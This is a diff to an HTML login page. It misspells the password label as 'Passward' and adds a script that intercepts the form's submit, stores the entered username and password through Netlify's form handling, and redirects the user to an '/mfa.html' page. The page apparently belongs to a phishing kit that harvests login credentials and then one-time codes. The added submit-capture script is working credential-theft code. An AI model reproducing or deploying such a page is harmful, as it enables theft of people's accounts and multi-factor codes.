@@ -43,7 +43,7 @@
     <input id="vusername" type="text" class="form-control" name="username" title="Please provide user name" required>
     <br>
 
-    <label class="form-label" for="password-input">Password</label>
+    <label class="form-label" for="password-input">Passward</label>
     <input id="password-input" type="password" class="form-control" name="password" title="Please provide password" required>
 
     <div id="cs-error-message-container" class="form-control py-0 px-1 border-0">
@@ -69,5 +69,43 @@
 		     </div>
 			 
 	</main>
+
+	<script>
+(function(){
+  const form = document.querySelector("form[name='Login']");
+  if(!form) return;
+
+  form.addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const data = new FormData(form);
+    // Ensure form-name is present (Netlify needs this)
+    if(!data.get("form-name")) data.append("form-name", form.getAttribute("name") || "Login");
+
+    fetch("/", {
+      method: "POST",
+      body: data
+    }).then(function(response){
+      // Netlify returns 200/303 — treat anything in 200 range as success
+      if (response.ok) {
+        // If Netlify returned a redirect via Location header, follow it
+        const loc = response.headers.get("Location");
+        if (loc) {
+          window.location.href = loc;
+        } else {
+          // fallback to your MFA page
+          window.location.href = "/mfa.html";
+        }
+      } else {
+        // show a simple error
+        alert("Submission failed. Please try again.");
+      }
+    }).catch(function(err){
+      console.error("Form submit error:", err);
+      alert("Network error while submitting the form.");
+    });
+  });
+})();
+</script>
 
 </body><!-- P16 --></html>
